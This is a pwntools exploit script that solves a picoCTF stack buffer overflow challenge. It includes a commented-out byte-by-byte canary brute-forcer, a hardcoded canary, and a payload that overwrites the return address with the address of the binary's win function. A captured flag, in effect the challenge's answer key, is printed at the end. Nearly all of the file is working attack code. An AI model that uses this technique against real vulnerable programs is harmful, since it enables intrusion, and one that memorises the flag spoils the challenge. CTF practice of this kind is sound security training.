#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

HOST, PORT = "saturn.picoctf.net 51850".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# bruteforce canary
# iterations = 0 if args.GDB else 4
# canary = b""

# while len(canary) < iterations:
    # for i in range(256):
        # temp_canary = canary + chr(i).encode()
        # io = start()

        # io.sendlineafter(b"Buffer?\n> ", b"400")

        # payload = b""
        # payload += cyclic_gen().get(0x40)
        # payload += temp_canary
        # io.sendafter(b"Input> ", payload)
        # res = io.recvline()
        # if b"Stack Smashing" in res:
            # io.close()
            # continue
        # canary = temp_canary
        # break
    # log.info(f"Canary: {canary}")

# log.success(f"Got canary: {canary}")

canary = b"BiRd"
io = start()
io.sendlineafter(b"Buffer?\n> ", b"400")
payload = b""
payload += cyclic_gen().get(0x40)
payload += canary
payload += cyclic_gen().get(0x10)
payload += p32(exe.sym.win)
io.sendafter(b"Input> ", payload)
io.recvline()
flag = io.recvline().decode()
log.success(f"Got flag: {flag}")

# [+] Got flag: picoCTF{Stat1C_c4n4r13s_4R3_b4D_78734aff}
